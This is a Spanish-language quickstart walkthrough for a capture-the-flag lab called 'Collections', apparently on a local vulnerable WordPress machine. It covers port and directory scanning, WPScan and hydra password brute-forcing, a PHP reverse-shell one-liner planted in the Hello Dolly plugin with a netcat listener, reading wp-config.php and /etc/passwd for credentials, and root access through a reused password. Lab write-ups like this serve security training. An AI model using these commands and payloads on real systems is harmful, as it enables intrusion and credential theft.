# QuickStart - Collections CTF

## Objetivo
Escalar privilegios desde usuario regular hasta **root** en un entorno WordPress vulnerable.

---

## Pasos Rápidos

### 1. **Escaneo de Puertos**
```bash
nmap -p- -sV <IP_target>
```
**Resultado esperado:** Puertos 22 (SSH), 80 (HTTP), 27017 (MongoDB) abiertos.

### 2. **Enumeración Web**
```bash
gobuster dir -u http://<IP_target> -w /usr/share/wordlists/dirb/common.txt
```
**Objetivo:** Identificar directorios críticos y panel WordPress.

### 3. **Agregar Dominio**
```bash
echo "172.17.0.2  collections.dl" >> /etc/hosts
```
Navega a `http://collections.dl`

### 4. **Obtener Usuario sobre WordPress**
- Revisa el contenido público del sitio
- Identifica usuario: **chocolate**

### 5. **Ataque de Fuerza Bruta con WPScan**
```bash
wpscan --url http://collections.dl --enumerate u,p --passwords /usr/share/wordlists/rockyou.txt
```
**Resultado:** Credenciales para usuario chocolate obtenidas.

### 6. **Acceder a wp-admin**
- Login: `chocolate`
- Contraseña: (obtenida de WPScan)
- URL: `http://collections.dl/wp-admin.php`

### 7. **Explotar Extensión Hello Dolly**
- Dirigirse a: **Plugins → Hello Dolly → Edit**
- Insertar payload **Pentestmonkey PHP reverse shell** al inicio del código:
```php
php -r '$sock=fsockopen("<TU_IP>",<PUERTO>);exec("/bin/bash -i <&3 >&3 2>&3");'
```
- Cambiar `<TU_IP>` y `<PUERTO>` con tus valores
- Guardar cambios

### 8. **Configurar Listener**
```bash
nc -lvnp <PUERTO>
```

### 9. **Activar Extensión y Obtener Reverse Shell**
- En wp-admin, activar Hello Dolly
- Recibir conexión en netcat

### 10. **Explorar Sistema**
```bash
cat /etc/passwd  # Identificar usuarios: chocolate, dbadmin
ls /var/www/html/wordpress/
cat /var/www/html/wordpress/wp-config.php  # Buscar credenciales
```

### 11. **Ataque de Fuerza Bruta SSH (Chocolate)**
```bash
hydra -l chocolate -P <wordlist> ssh://<IP_target>
```
**Resultado:** Contraseña para usuario chocolate

### 12. **SSH como Chocolate**
```bash
ssh chocolate@<IP_target>
```

### 13. **Buscar Credenciales Adicionales**
```bash
find ~ -name "*mongo*" -o -name "*database*" -o -name "*config*"
cat ~/.mongodb/history  # O similar
```
**Obtener credenciales de usuario: dbadmin**

### 14. **Escalar a dbadmin**
```bash
su dbadmin
# Ingresar contraseña encontrada
```

### 15. **Escalar a Root (Paso Final)**
```bash
su root
# Ingresar MISMA contraseña de dbadmin
```

🎯 **¡CTF Completado!**

---

## Notas Clave
- La contraseña de root es la misma que la de dbadmin
- El archivo `wp-config.php` contiene credenciales críticas
- Hello Dolly es vulnerable al RCE si modificas su código
- Revisar archivos de historial de usuarios es fundamental para escalada

